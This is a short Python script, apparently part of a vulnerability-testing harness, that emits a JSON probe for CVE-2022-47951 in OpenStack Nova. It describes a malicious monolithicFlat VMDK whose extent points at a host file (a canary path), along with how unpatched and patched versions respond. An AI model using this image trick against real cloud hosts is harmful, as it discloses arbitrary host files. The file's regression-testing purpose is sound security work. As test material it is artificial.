#!/usr/bin/env python3
"""[GIVEN] CVE-2022-47951 seed exploit -- a malicious monolithicFlat VMDK whose
FLAT extent references an arbitrary host file (the planted canary, outside any
image store), uploaded HONESTLY as disk_format=vmdk.

In Nova's image pipeline, fetch_to_raw() safety-checks the image before qemu-img
converts it. The CVE-2022-47951 fix restricts VMDK to a create-type allowlist
(check_vmdk_image) and adds format_inspector deep inspection; a monolithicFlat
descriptor claimed as vmdk is rejected before any host file is read.

Contract:
  * V0 (pre-CVE-2022-47951)      : allowed  -> qemu-img convert reads the FLAT
                                   extent -> canary (flag) disclosed.
  * V1 (CVE-2022-47951 patched)  : BLOCKED  -> do_image_deep_inspection sees the
                                   descriptor is not a real (KDMV) VMDK and
                                   check_vmdk_image bars monolithicFlat. Seed
                                   given to the SUT.
"""
from __future__ import annotations

CANARY_PATH = "/canary/secret.txt"  # outside any image store


def candidate() -> dict:
    """candidate_schema shape: a malicious-image probe. `claim` = the disk_format
    Nova is told; `extent` = the host file the FLAT descriptor points at."""
    return {
        "probe_id": "cve-2022-47951-vmdk-monolithicflat",
        "claim": "vmdk",
        "extent": CANARY_PATH,
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate()))
